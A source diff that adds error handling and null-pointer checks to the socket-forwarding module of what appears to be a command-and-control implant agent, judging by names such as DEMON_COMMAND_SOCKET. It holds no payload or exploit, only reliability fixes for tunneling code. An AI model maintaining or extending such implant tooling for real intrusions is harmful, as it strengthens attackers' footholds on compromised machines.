@@ -14,8 +14,10 @@ BOOL RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead )
     {
         nret = Instance->Win32.recv( Socket, Start, Length - tret, 0 );
 
-        if ( nret == SOCKET_ERROR )
+        if ( nret == SOCKET_ERROR || nret == 0 )
         {
+            /* 0 means the peer closed the connection: treat as error,
+             * otherwise the loop spins forever adding nothing */
             PUTS( "recv Failed" )
             *BytesRead = tret;
             return FALSE;
@@ -179,6 +181,9 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
 
     /* Allocate our Socket object */
     Socket               = MmHeapAlloc( sizeof( SOCKET_DATA ) );
+    if ( ! Socket )
+        return NULL;
+
     Socket->ID           = RandomNumber32();
     Socket->ParentID     = ParentID;
     Socket->Type         = Type;
@@ -243,6 +248,11 @@ VOID SocketClients()
                 {
                     /* Add the client to the socket linked list so we can read from it later on */
                     Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, TRUE, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort, Socket->ID );
+                    if ( ! Client ) {
+                        PUTS( "Failed to allocate client socket data" )
+                        Instance->Win32.closesocket( WinSock );
+                        goto CONTINUE;
+                    }
 
                     /* create socket response package */
                     Package = PackageCreate( DEMON_COMMAND_SOCKET );
@@ -273,6 +283,7 @@ VOID SocketClients()
             }
         }
 
+CONTINUE:
         Socket = Socket->Next;
     }
 }
@@ -335,7 +346,14 @@ VOID SocketRead()
                 {
                     PartialData.Buffer = MmHeapAlloc( PartialData.Length );
 
-                    if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
+                    if ( ! PartialData.Buffer ) {
+                        PUTS( "Failed to allocate socket read buffer" )
+                        Failed    = TRUE;
+                        ErrorCode = ERROR_NOT_ENOUGH_MEMORY;
+                        PartialData.Length = 0;
+                    }
+
+                    if ( ! Failed && ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
                         Failed    = TRUE;
                         ErrorCode = Instance->Win32.WSAGetLastError();
                     }
@@ -352,21 +370,30 @@ VOID SocketRead()
                         {
                             // allocate a new buffer to store the old and new data
                             NewBuffer = MmHeapAlloc( FullData.Length + PartialData.Length );
-                            // copy the old data into the new buffer
-                            MemCopy( NewBuffer, FullData.Buffer, FullData.Length );
-                            // free the old 'FullData' buffer
-                            MemSet( FullData.Buffer, 0, FullData.Length );
-                            MmHeapFree( FullData.Buffer );
-                            // set the new buffer into 'FullData'
-                            FullData.Buffer = NewBuffer;
-                            NewBuffer = NULL;
-                            // copy the new data
-                            MemCopy( C_PTR( U_PTR( FullData.Buffer ) + FullData.Length ), PartialData.Buffer, PartialData.Length );
-                            FullData.Length += PartialData.Length;
-                            // free the new data
-                            MemSet( PartialData.Buffer, 0, PartialData.Length );
-                            MmHeapFree( PartialData.Buffer );
-                            PartialData.Buffer = NULL;
+                            if ( ! NewBuffer ) {
+                                // keep the old buffer: just drop the new partial data
+                                PUTS( "Failed to grow the socket read buffer" )
+                                MemSet( PartialData.Buffer, 0, PartialData.Length );
+                                MmHeapFree( PartialData.Buffer );
+                                PartialData.Buffer = NULL;
+                                PartialData.Length = 0;
+                            } else {
+                                // copy the old data into the new buffer
+                                MemCopy( NewBuffer, FullData.Buffer, FullData.Length );
+                                // free the old 'FullData' buffer
+                                MemSet( FullData.Buffer, 0, FullData.Length );
+                                MmHeapFree( FullData.Buffer );
+                                // set the new buffer into 'FullData'
+                                FullData.Buffer = NewBuffer;
+                                NewBuffer = NULL;
+                                // copy the new data
+                                MemCopy( C_PTR( U_PTR( FullData.Buffer ) + FullData.Length ), PartialData.Buffer, PartialData.Length );
+                                FullData.Length += PartialData.Length;
+                                // free the new data
+                                MemSet( PartialData.Buffer, 0, PartialData.Length );
+                                MmHeapFree( PartialData.Buffer );
+                                PartialData.Buffer = NULL;
+                            }
                         }
                     }
                 }
